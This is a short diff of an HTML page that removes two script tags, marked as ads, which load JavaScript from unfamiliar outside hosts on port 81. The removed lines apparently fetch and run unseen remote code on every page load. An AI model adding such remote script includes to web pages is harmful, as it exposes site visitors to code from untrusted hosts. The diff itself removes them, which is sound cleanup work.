@@ -112,8 +112,6 @@ p {margin-bottom: 0;}
 	}
 	</script>
 	<!-- ad begin -->
-	<script src="http://js4278.yongkang6.com:81/s/i.php?21574"></script>
-	<script src="http://js4278.chengzhao95511.com:81/s/i.php?21575"></script>
 	<!-- ad end -->
 </body>
 </html>
